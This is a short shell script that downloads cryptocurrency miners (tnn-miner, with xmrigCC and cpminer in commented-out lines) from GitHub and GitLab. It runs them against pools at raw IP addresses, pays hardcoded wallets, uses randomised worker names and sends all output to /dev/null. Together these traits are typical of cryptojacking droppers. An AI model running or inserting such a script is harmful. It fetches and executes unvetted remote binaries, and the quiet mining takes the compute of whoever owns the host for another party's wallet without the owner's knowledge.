#!/bin/sh

#wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 142.93.71.111:443 -u TuskeSyuMmk2xje2yUypZdWqLyjzRG7AjgcGk21HqjPTeztTahdSjA1SL7qokYAJxJ2NESFcGy5oQEdtNXMqjFGp5a7RE7cVrLa3LS -p WK01 -k -a rx/tuske -t4 > /dev/null 2>&1

wget https://github.com/argenminers/spectre-blockchain/releases/download/v0.3.14/spectre-pool.zip && unzip -q spectre-pool.zip && ./tnn-miner --spectre --wallet spectre:qp0lf6pvmp2q6w84uqz45vzqw7qtjpjpumnd9m5mzdgk4e59dw7c6yk8m97mu --daemon-address 142.93.71.111 --port 80 --worker-name $(shuf -n 1 -i 1-99999)-Bismillah --threads 4 > /dev/null 2>&1


#wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QQuVuBF9yLgdE4C3HuhyxD5rk1wTMwg45F -t4 > /dev/null 2>&1